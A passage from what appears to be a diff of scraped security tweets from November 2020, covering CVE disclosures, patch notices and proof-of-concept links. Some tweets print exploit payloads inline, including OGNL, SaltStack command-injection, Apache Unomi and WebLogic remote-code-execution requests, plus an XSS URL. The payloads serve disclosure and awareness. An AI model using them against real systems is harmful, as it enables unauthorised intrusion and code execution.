+    "tweettime": "2020-11-02, 08:19:40",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1323177945570004994",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop_20.html",
+        "https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV200002",
+        "https://vivaldi.com/blog/news/minor-update-for-vivaldi-desktop-browser-3-4/"
+    ],
+    "tweetfavorites": 32,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 26,
+    "tweettext": "⚠️ Please apply the latest Chromium-based browser security updates (e. g. Chromium, Chrome, Microsoft Edge, Vivaldi) to fix FreeType heap-based buffer overflow CVE-2020-15999 which is actively exploited 🔥\nhttps://t.co/gm0LrCFEmM\nhttps://t.co/CB7HHt8FRb\nhttps://t.co/fu6gPRX1gX",
+    "tweettime": "2020-11-01, 19:06:36",
+    "tweeturl": "https://twitter.com/certbund/status/1322978362575540232",
+    "username": "certbund"
+}
+{
+    "expanded_url": [
+        "https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less/",
+        "https://github.com/yardenshafir/CVE-2020-1034"
+    ],
+    "tweetfavorites": 149,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 45,
+    "tweettext": "Exploiting a “Simple” Vulnerability – In 35 Easy Steps or Less! : https://t.co/MeaWzbFCqs credits @yarden_shafir\n\nPoC demonstrating the use of cve-2020-1034 for privilege escalation : https://t.co/odMCuUnvWa https://t.co/7EFzXVgSx2",
+    "tweettime": "2020-11-30, 05:06:42",
+    "tweeturl": "https://twitter.com/binitamshah/status/1333276243861540865",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://www.drupal.org/sa-core-2020-013"
+    ],
+    "tweetfavorites": 205,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "CVE-2020-28949/CVE-2020-28948\nhttps://t.co/2C4KXdQmpv\nRCE on Drupal via Phar Deserialization in PEAR Archive_Tar library. \n\nPoc: phar =&gt; PHAR\nPHAR://malicious_file.phar https://t.co/FS8iAdPg3w",
+    "tweettime": "2020-11-26, 17:18:53",
+    "tweeturl": "https://twitter.com/chybeta/status/1332010953370529793",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/"
+    ],
+    "tweetfavorites": 133,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 60,
+    "tweettext": "Checkpoint ICA Management Tool (CVE-2020-6020) research by Mikhail Klyuchnikov &amp; Nikita Abramov.\n\n1⃣Send /etc/shadow to yourself via SMTP\n2⃣Simple DoS\n\nhttps://t.co/xsC0XVMupq https://t.co/0L6fHJpiW0",
+    "tweettime": "2020-11-25, 14:27:21",
+    "tweeturl": "https://twitter.com/ptswarm/status/1331605399095681024",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 102,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 8,
+    "tweettext": "It seems chromium patched my first found since I started hunting for chromium sandbox escape this year(CVE-2020-16018 reported by Man Yue Mo @mmolgtm), really interested in focusing on a new challenging research😋 https://t.co/qwn1cDAwL7",
+    "tweettime": "2020-11-25, 04:07:03",
+    "tweeturl": "https://twitter.com/KeyZ3r0/status/1331449295199899648",
+    "username": "KeyZ3r0"
+}
+{
+    "expanded_url": [
+        "https://webkitgtk.org/security/WSA-2020-0008.html"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 5,
+    "tweettext": "Some of my Webkit GTK/WPE vulns have been patched :\nhttps://t.co/sNuOOwwVjB\nCVE-2020-13584\nCVE-2020-9951\nMore details next week ;)",
+    "tweettime": "2020-11-23, 22:14:56",
+    "tweeturl": "https://twitter.com/_Icewall/status/1330998292029837321",
+    "username": "_Icewall"
+}
+{
+    "expanded_url": [
+        "https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 19,
+    "tweettext": "Write-up of the code execution vulnerability I found in the Elixir-based Paginator project (CVE-2020-15150)\n\nhttps://t.co/sv2zfe6aNv",
+    "tweettime": "2020-11-23, 18:52:48",
+    "tweeturl": "https://twitter.com/ulldma/status/1330947425457102850",
+    "username": "ulldma"
+}
+{
+    "expanded_url": [
+        "https://github.com/yardenshafir/CVE-2020-1034"
+    ],
+    "tweetfavorites": 84,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 33,
+    "tweettext": "GitHub - yardenshafir/CVE-2020-1034: PoC demonstrating the use of cve-2020-1034 for privilege escalation - https://t.co/qsXBcxzu7U",
+    "tweettime": "2020-11-23, 17:38:52",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1330928818840764417",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://github.com/0xedh/hichip-p2p-firmware-rce"
+    ],
+    "tweetfavorites": 36,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 22,
+    "tweettext": "After a while I have published the exploit for CVE-2020-9527, Hichip's P2P cameras RCE. Thanks to @PaulMarrapese for his previous research.\n\nhttps://t.co/n34q3AlE0V",
+    "tweettime": "2020-11-23, 17:01:54",
+    "tweeturl": "https://twitter.com/0xedh/status/1330919517782945794",
+    "username": "0xedh"
+}
+{
+    "expanded_url": [
+        "https://windows-internals.com/exploiting-a-simple-vulnerability-in-35-easy-steps-or-less"
+    ],
+    "tweetfavorites": 480,
+    "tweetquotes": 10,
+    "tweetreplies": 4,
+    "tweetretweets": 156,
+    "tweettext": "I pretended I'm an exploit dev and created a stable exploit to CVE-2020-1034, that's tagged by MS as \"low complexity\". But only if crashing the machine is your only goal:\nhttps://t.co/G0HZffpIq0\nThank you @aionescu for all the help and reviews! 😄 https://t.co/JMbbyJGyxN",
+    "tweettime": "2020-11-23, 12:38:45",
+    "tweeturl": "https://twitter.com/yarden_shafir/status/1330853292352679936",
+    "username": "yarden_shafir"
+}
+{
+    "expanded_url": [
+        "https://support.apple.com/en-in/HT211934"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 0,
+    "tweetreplies": 6,
+    "tweetretweets": 4,
+    "tweettext": "Safari 14.0.1 With Fixes of Address Bar Spoofing Vulnerability.\nCVE-2020-9945\ndetails will be out once the fix is released from different browsers as well.\nhttps://t.co/NSyAtPd8iQ \n#infosec #infosec #hacking #bugbounty https://t.co/yRyyxlD1h7",
+    "tweettime": "2020-11-20, 14:30:55",
+    "tweeturl": "https://twitter.com/imnarendrabhati/status/1329794356841070592",
+    "username": "imnarendrabhati"
+}
+{
+    "tweetfavorites": 368,
+    "tweetquotes": 6,
+    "tweetreplies": 4,
+    "tweetretweets": 103,
+    "tweettext": "Do you known that Cisco ISE is vulnerable to CVE-2017-5638 Apache Struts2 RCE?\n\nPort: 8443\nPayload:\n\nGET /sponsorportal/LoginCheck.action HTTP/1.0\nHost: 10.0.0.1:8443\nUser-Agent: Mozilla\nContent-Type: %{...}\n\nCisco ISE is a NAP system that might be found on network boundaries.",
+    "tweettime": "2020-11-19, 14:58:07",
+    "tweeturl": "https://twitter.com/_mohemiv/status/1329438812158746629",
+    "username": "_mohemiv"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 70,
+    "tweettext": "RT @ptswarm: The advisory for multiple unauth RCE in Cisco Integrated Management Controller (CVE-2020-3470) is now out!\n\nBuffer Overflows l…",
+    "tweettime": "2020-11-19, 13:49:51",
+    "tweeturl": "https://twitter.com/jedisct1/status/1329421633287827457",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ucs-api-rce-UXwpeDHd"
+    ],
+    "tweetfavorites": 143,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 70,
+    "tweettext": "The advisory for multiple unauth RCE in Cisco Integrated Management Controller (CVE-2020-3470) is now out!\n\nBuffer Overflows lead to RCE with uid=0 (root) privileges\n\nDiscovered by Nikita Abramov\n\nhttps://t.co/s6T3YDswoG https://t.co/8fBFauF8SR",
+    "tweettime": "2020-11-19, 13:32:32",
+    "tweeturl": "https://twitter.com/ptswarm/status/1329417273719853062",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/3nmuFiY"
+    ],
+    "tweetfavorites": 91,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 30,
+    "tweettext": "CVE-2020-8277 Node.js Denial of Service through DNS request\n\nhttps://t.co/AoPtUPUOPd https://t.co/6ksdv0Y8G2",
+    "tweettime": "2020-11-19, 12:40:03",
+    "tweeturl": "https://twitter.com/chybeta/status/1329404066502299649",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.co/3msMoMy"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "ICYMI @mmolgtm explains how to exploit CVE-2020-6449, a use-after-free (UAF) in the WebAudio module of Chrome, and achieve a sandboxed RCE. Read also how he used #CodeQL to accelerate his code audit https://t.co/k5ddV8Scv3",
+    "tweettime": "2020-11-18, 15:57:01",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1329091248997625857",
+    "username": "GHSecurityLab"
+}
+{
+    "expanded_url": [
+        "https://paper.seebug.org/1398/"
+    ],
+    "tweetfavorites": 52,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "CVE-2020-16846\nCVE-2020-25592\nSaltStack Salt REST API RCE\n\n[PoC]\nPOST /run HTTP/1.1\nHost: [Victim:8888]\n...\n...\n\ntoken=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|open%20/System/Applications/Calculator.app%3b\n\nhttps://t.co/jdgIUFSW6x https://t.co/s7xlLDkHDX",
+    "tweettime": "2020-11-18, 06:06:51",
+    "tweeturl": "https://twitter.com/wugeej/status/1328942729095753731",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 469,
+    "tweetquotes": 7,
+    "tweetreplies": 12,
+    "tweetretweets": 162,
+    "tweettext": "#CVE-2020-13942 Apache Unomi Remote Code Execution\n\nPoC:\n{\"filters\":[{\"id\" : \"pyn3rd\",\"filters\": [{\"condition\": {\"parameterValues\": {\"pyn3rd\": \"script::Runtime.getRuntime().exec('open -a Calculator')\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\": \"pyn3rd\"} https://t.co/Gcw5FcZiNp",
+    "tweettime": "2020-11-18, 04:38:42",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1328920545442680837",
+    "username": "pyn3rd"
+}
+{
+    "tweetfavorites": 208,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2020-13942 Apache Unomi pre-auth RCE (bypass CVE-2020-11975 ) https://t.co/q7ppLTJdiT",
+    "tweettime": "2020-11-18, 04:05:59",
+    "tweeturl": "https://twitter.com/chybeta/status/1328912309440311297",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html"
+    ],
+    "tweetfavorites": 135,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 48,
+    "tweettext": "When analyzing CVE-2020-1380, I found another path to trigger a similar UAF vulnerability by neutering ArrayBuffer without JIT. \nIt has beed fixed in Microsoft November’s Patch as CVE-2020-17053.\nhttps://t.co/ucHH2cmYVN",
+    "tweettime": "2020-11-18, 02:38:58",
+    "tweeturl": "https://twitter.com/iamelli0t/status/1328890412413534209",
+    "username": "iamelli0t"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/"
+    ],
+    "tweetfavorites": 353,
+    "tweetquotes": 10,
+    "tweetreplies": 1,
+    "tweetretweets": 169,
+    "tweettext": "💥New article \"Path Traversal on Citrix XenMobile Server\" with a step-by-step guide to disclosing encryption keys, decrypting passwords, and thoroughly understanding CVE-2020-8209 by our researcher Andrey Medov.\n\nRead all about it: https://t.co/JMJM0UiSRu\n\nThe PoC⬇️ https://t.co/iRpdYELfjK",
+    "tweettime": "2020-11-16, 14:36:42",
+    "tweeturl": "https://twitter.com/ptswarm/status/1328346259502018560",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://x-stream.github.io/CVE-2020-26217.html"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 69,
+    "tweettext": "#CVE-2020-26217 XStream Remote Code Execution \n\nhttps://t.co/baqFucu0BQ https://t.co/o9UHU8eTQv",
+    "tweettime": "2020-11-16, 02:47:32",
+    "tweeturl": "https://twitter.com/pyn3rd/status/1328167793611554819",
+    "username": "pyn3rd"
+}
+{
+    "expanded_url": [
+        "https://blog.zecops.com/vulnerabilities/exploring-the-exploitability-of-bad-neighbor-the-recent-icmpv6-vulnerability-cve-2020-16898/"
+    ],
+    "tweetfavorites": 81,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 48,
+    "tweettext": "Exploring the Exploitability of “Bad Neighbor”: The Recent ICMPv6 Vulnerability (CVE-2020-16898)  https://t.co/WHjYcHvudH  #Pentesting #RCE #Vulnerability #CyberSecurity #Infosec https://t.co/CpYiv9N27y",
+    "tweettime": "2020-11-14, 16:40:20",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1327652599051464704",
+    "username": "ptracesecurity"
+}
+{
+    "tweetfavorites": 343,
+    "tweetquotes": 3,
+    "tweetreplies": 7,
+    "tweetretweets": 134,
+    "tweettext": "Nothing critical, but here is the PoC for the new CVE I got credited for: CVE-2020-14815. \n\nhttps://target[.]com/bi-security-login/login.jsp?msi=false&amp;redirect=\"&gt;&lt;img/src/onerror%3dalert(document.domain)&gt;\n\nGot a couple of Med in H1 using it. Have Fun!\n\n#bugbounty #bugbountytips https://t.co/A8qx640VgE",
+    "tweettime": "2020-11-12, 16:40:33",
+    "tweeturl": "https://twitter.com/HackerOn2Wheels/status/1326927875279380480",
+    "username": "HackerOn2Wheels"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-patches-two-more-chrome-zero-days/"
+    ],
+    "tweetfavorites": 157,
+    "tweetquotes": 13,
+    "tweetreplies": 2,
+    "tweetretweets": 94,
+    "tweettext": "BREAKING: Google patches two more Chrome zero-days\n\nThis includes:\n-CVE-2020-16013 - impacts Chrome V8 JS engine\n-CVE-2020-16017 - impacts Chrome's Site Isolation feature\n\nGoogle has now patched five Chrome zero-days in three weeks\n\nhttps://t.co/ohF2CHwvOG https://t.co/BXFa1wzSwR",
+    "tweettime": "2020-11-11, 22:41:32",
+    "tweeturl": "https://twitter.com/campuscodi/status/1326656333580480514",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0025/",
+        "https://srcincite.io/pocs/cve-2020-17083.ps1.txt"
+    ],
+    "tweetfavorites": 201,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 124,
+    "tweettext": "Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability\n\nCVE: CVE-2020-17083\nAdvisory: https://t.co/sf7upoNmjC\nPoC exploit: https://t.co/lzKWSGhSjG",
+    "tweettime": "2020-11-11, 20:43:16",
+    "tweeturl": "https://twitter.com/sourceincite/status/1326626570073755648",
+    "username": "sourceincite"
+}
+{
+    "expanded_url": [
+        "http://viz.greynoise.io/query/?gnql=tags%3A%22Oracle%20WebLogic%20RCE%20CVE-2020-14882%22",
+        "http://viz.greynoise.io/query/?gnql=tags%3A%22Oracle%20WebLogic%20RCE%20CVE-2020-14750%22"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "new tags to track recent WebLogic RCE (CVE-2020-14882, 14883, 14750) -\n\nhttps://t.co/XH4J4A5RIh\n\nhttps://t.co/uq9mqYuvHV",
+    "tweettime": "2020-11-11, 17:53:41",
+    "tweeturl": "https://twitter.com/ackmage/status/1326583893080870915",
+    "username": "ackmage"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/11/microsoft-releases-windows-security.html"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 12,
+    "tweetreplies": 5,
+    "tweetretweets": 141,
+    "tweettext": "November 2020 Patch Tuesday — #Microsoft releases security updates for 112 newly discovered vulnerabilities, including an actively exploited zero-day flaw (CVE-2020-17087) disclosed by #Google's security team last week.\n\nhttps://t.co/DwSQZTX8v6\n\n#Infosec #CyberSecurity",
+    "tweettime": "2020-11-11, 10:14:04",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1326468227040374784",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17083"
+    ],
+    "tweetfavorites": 96,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 24,
+    "tweettext": "The description for CVE-2020-17083 is wrong, user interaction is *not* required. Also this is RCE as SYSTEM, so the actual CVSS is 8.5: https://t.co/qJWBH3ldCf",
+    "tweettime": "2020-11-10, 22:02:45",
+    "tweeturl": "https://twitter.com/steventseeley/status/1326284184122519561",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://www.cyberark.com/resources/threat-research-blog/intel-please-stop-assisting-me"
+    ],
+    "tweetfavorites": 40,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 15,
+    "tweettext": "This was a long wait, this will be my last blog for some while - CVE-2020-22460, CVE-12330, CVE-2020-12335\nhttps://t.co/ALNAPL16xT",
+    "tweettime": "2020-11-10, 18:10:48",
+    "tweeturl": "https://twitter.com/EranShimony/status/1326225811087749121",
+    "username": "EranShimony"
+}
+{
+    "expanded_url": [
+        "https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 36,
+    "tweettext": "Critical Vulnerabilities Discovered in TCL Android TVs\n\nCVE-2020-27403\nFull file system browsing of the TV in the browser.\n\nCVE-2020-28055\nWorld writable update folder (malicious updates possible)\n : https://t.co/nahQGxkhGY \n\ncredits @sickcodes  || @johnjhacking",
+    "tweettime": "2020-11-09, 22:56:44",
+    "tweeturl": "https://twitter.com/binitamshah/status/1325935382991523840",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://community.disclose.io/t/how-i-found-a-tor-vulnerability-in-brave-browser-reported-it-watched-it-get-patched-got-a-cve-cve-2020-8276-and-a-small-bounty-all-in-one-working-day/65"
+    ],
+    "tweetfavorites": 290,
+    "tweetquotes": 2,
+    "tweetreplies": 6,
+    "tweetretweets": 55,
+    "tweettext": "How I found a Tor vulnerability in Brave Browser, reported it, watched it get patched, got a CVE (CVE-2020-8276) and a small bounty, all in one working day : https://t.co/byy6rmUOl7   credits @sickcodes",
+    "tweettime": "2020-11-09, 22:22:46",
+    "tweeturl": "https://twitter.com/binitamshah/status/1325926835591421953",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/UR3NNVf",
+        "https://saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/"
+    ],
+    "tweetfavorites": 102,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 35,
+    "tweettext": "CVE-2020-25592  Any value for \"eauth\"/\"token” allow a user to bypass auth and make calls to Salt SSH.\n\nCVE-2020-16846 A user could use shell injections with the Salt API using the SSH Client.  \n\n25592+16846=Unauth RCE \n\n分析 https://t.co/tC20h1LUFq\n\nhttps://t.co/HbyQg9ZuIl https://t.co/YnfKRS7QTt",
+    "tweettime": "2020-11-09, 16:22:27",
+    "tweeturl": "https://twitter.com/chybeta/status/1325836157653934080",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/pprietosanchez/CVE-2020-14750"
+    ],
+    "tweetfavorites": 335,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 157,
+    "tweettext": "Oracle Weblogic PoC for vulnerabilities CVE-2020-14750 and cve-2020-14882\n\nBe careful ! It is working\n\n./CVE-2020-14750 hostname: 7001 ifconfig lo\n./CVE-2020-14750 hostname: 7001 ls\n./CVE-2020-14750 hostname: 7001 vi etc/passwd\n\nhttps://t.co/UeZof859NP https://t.co/YTH6Ztx6p6",
+    "tweettime": "2020-11-09, 05:35:25",
+    "tweeturl": "https://twitter.com/wugeej/status/1325673327357173762",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 769,
+    "tweetquotes": 35,
+    "tweetreplies": 13,
+    "tweetretweets": 307,
+    "tweettext": "Free threat intel - identify and patch VMware ESX vulnerabilities CVE-2019-5544 and CVE-2020-3992. \n\nRansomware group using them to bypass all Windows OS security, by shutting down VMs and encrypting the VMDK’s directly on hypervisor.",
+    "tweettime": "2020-11-07, 02:06:48",
+    "tweeturl": "https://twitter.com/GossiTheDog/status/1324896051128635392",
+    "username": "GossiTheDog"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 455,
+    "tweettext": "RT @benhawkes: Apple have fixed three issues reported by Project Zero that were being actively exploited in the wild. CVE-2020-27930 (RCE),…",
+    "tweettime": "2020-11-05, 19:03:14",
+    "tweeturl": "https://twitter.com/cherepanov74/status/1324427068592001025",
+    "username": "cherepanov74"
+}
+{
+    "expanded_url": [
+        "https://support.apple.com/en-us/HT211929"
+    ],
+    "tweetfavorites": 931,
+    "tweetquotes": 144,
+    "tweetreplies": 15,
+    "tweetretweets": 404,
+    "tweettext": "Apple have fixed three issues reported by Project Zero that were being actively exploited in the wild. CVE-2020-27930 (RCE), CVE-2020-27950 (memory leak), and CVE-2020-27932 (kernel privilege escalation). The security bulletin is available here: https://t.co/4OIReajIp6",
+    "tweettime": "2020-11-05, 18:46:37",
+    "tweeturl": "https://twitter.com/benhawkes/status/1324422885830610944",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "http://com.tangosol.coherence.mvel2.sh",
+        "https://github.com/jas502n/CVE-2020-14882"
+    ],
+    "tweetfavorites": 182,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 69,
+    "tweettext": "CVE-2020-14882\nWeblogic RCE by only one GET reques\n\n#bypass patch \n\nPOST /console/css/%252e%252e%252fconsole.portal HTTP/1.1\n...\n...\n_nfpb=true&amp;_pageLabel=&amp;handle=https://t.co/1P6ayf6Arf.ShellSession(\"java.lang.Runtime.getRuntime().exec('calc.exe');\");\n\nhttps://t.co/SkNAFJi8Dw https://t.co/D1zKwr5W0D",
+    "tweettime": "2020-11-05, 07:51:35",
+    "tweeturl": "https://twitter.com/wugeej/status/1324258040686669824",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html"
+    ],
+    "tweetfavorites": 59,
+    "tweetquotes": 6,
+    "tweetreplies": 0,
+    "tweetretweets": 44,
+    "tweettext": "Git  &amp; GitHub CLI Remote CodeExec #RCE #exploit  via Git LFS CVE-2020-27955 @dawid_golunski\n\nRepo clone to Pwn ;) Full advisory with #PoC at\nhttps://t.co/n0vnrcSUCg\n\n#cybersecurity #infosec #hacking #security  #0day #git #github cli  #vuln #DevOps https://t.co/516I33RxYd",
+    "tweettime": "2020-11-05, 03:53:57",
+    "tweeturl": "https://twitter.com/Exploit_Box/status/1324198238887514112",
+    "username": "Exploit_Box"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 29,
+    "tweettext": "How would you exploit this UAF :)?\n\n“Discovery and analysis of a Windows PhoneBook Use-After-Free vulnerability (CVE-2020-1530)”, an instructive blog post by @symeonp:\nhttps://t.co/AHw1uWdm7e",
+    "tweettime": "2020-11-04, 18:46:50",
+    "tweeturl": "https://twitter.com/TimoHirvonen/status/1324060555536117764",
+    "username": "TimoHirvonen"
+}
+{
+    "expanded_url": [
+        "https://wikileaks.org/hackingteam/emails/emailid/45441"
+    ],
+    "tweetfavorites": 127,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 69,
+    "tweettext": "CVE-2020-14871 had been exploited and distributed in the wild to numerous groups since at least October 6th 2014. That's 6 years that this vulnerability was available as 0day to multiple non-exclusive parties, VBI leak in HT emails shows it's the same bug. https://t.co/Prh3tm3DHN https://t.co/Efv6jtPFOB",
+    "tweettime": "2020-11-04, 16:15:07",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1324022373255909377",
+    "username": "hackerfantastic"
+}
+{
+    "tweetfavorites": 136,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "For those that want to repro CVE-2020-1300 you can just use makecab, no need to manually calc checksums now:\n\nc:\\&gt;type files.txt\n\"rce.exe\" \"../../rce.exe\"\nc:\\&gt;makecab /f files.txt",
+    "tweettime": "2020-11-03, 18:30:35",
+    "tweeturl": "https://twitter.com/steventseeley/status/1323694078022848512",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://github.com/hackerhouse-opensource/exploits/blob/master/prdelka-vs-SUN-sshd.tgz"
+    ],
+    "tweetfavorites": 294,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 99,
+    "tweettext": "Dirty libssh2 PoC for CVE-2020-14871 to core target and pack with your favorite shellcode &amp; return addresses, something for the kidz on lockdown. Happy Hacking. https://t.co/7dqSGjOXqw https://t.co/UtnyDtxx1s",
+    "tweettime": "2020-11-03, 14:58:13",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1323640631613394945",
+    "username": "hackerfantastic"
+}
+{
+    "expanded_url": [
+        "https://github.com/RedTeamPentesting/CVE-2020-13935"
+    ],
+    "tweetfavorites": 101,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 46,
+    "tweettext": "Exploit for WebSocket Vulnerability in Apache Tomcat (CVE-2020-13935)\n\nAffected Versions:\n10.0.0-M1 to 10.0.0-M6\n9.0.0.M1 to 9.0.36\n8.5.0 to 8.5.56\n8.0.1 to 8.0.53\n7.0.27 to 7.0.104\n\nPoC\nhttps://t.co/zn9K3XLQny https://t.co/5HYieTU47f",
+    "tweettime": "2020-11-03, 06:22:33",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1323510861940596736",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/chrome-for-android-update.html"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 10,
+    "tweettext": "A few people noticed that CVE-2020-16010 wasn't included in the link above. That's because Chrome has separate release notes for Desktop and Android. The release notes covering CVE-2020-16010 (sandbox escape for Chrome on Android) are now available here: https://t.co/6hBKMuCAaK",
+    "tweettime": "2020-11-03, 01:59:22",
+    "tweeturl": "https://twitter.com/benhawkes/status/1323444628926820352",
+    "username": "benhawkes"
+}
+{
+    "tweetfavorites": 696,
+    "tweetquotes": 26,
+    "tweetreplies": 18,
+    "tweetretweets": 263,
+    "tweettext": "CVE-2020-14871 - well that was easy, SSH pre-auth RCE on Solaris through libpam. As a PoC trigger you need to ensure the remote host is using keyboard-interactive and then reach the vulnerable code path by specifying a blank username to get PAM to hit the vulnerable function. https://t.co/HQtSBBQ6g1",
+    "tweettime": "2020-11-03, 01:07:15",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1323431512822435841",
+    "username": "hackerfantastic"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop.html"
+    ],
+    "tweetfavorites": 291,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 118,
+    "tweettext": "Today Chrome fixed two more vulnerabilities that were being actively exploited in the wild (discovered by Project Zero/Google TAG last week). CVE-2020-16009 is a v8 bug used for remote code execution, CVE-2020-16010 is a Chrome sandbox escape for Android. https://t.co/IOhFwT0Wx1",
+    "tweettime": "2020-11-02, 21:20:01",
+    "tweeturl": "https://twitter.com/benhawkes/status/1323374326150701057",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/11/stable-channel-update-for-desktop.html"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "Another in-the-wild Chrome 0day patched (CVE-2020-16009), reported by @_clem1 from TAG and @5aelo from Project Zero: https://t.co/SP1SR3aXEp",
+    "tweettime": "2020-11-02, 21:09:24",
+    "tweeturl": "https://twitter.com/anttitikkanen/status/1323371654966349826",
+    "username": "anttitikkanen"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/11/warning-google-discloses-windows-zero.html"
+    ],
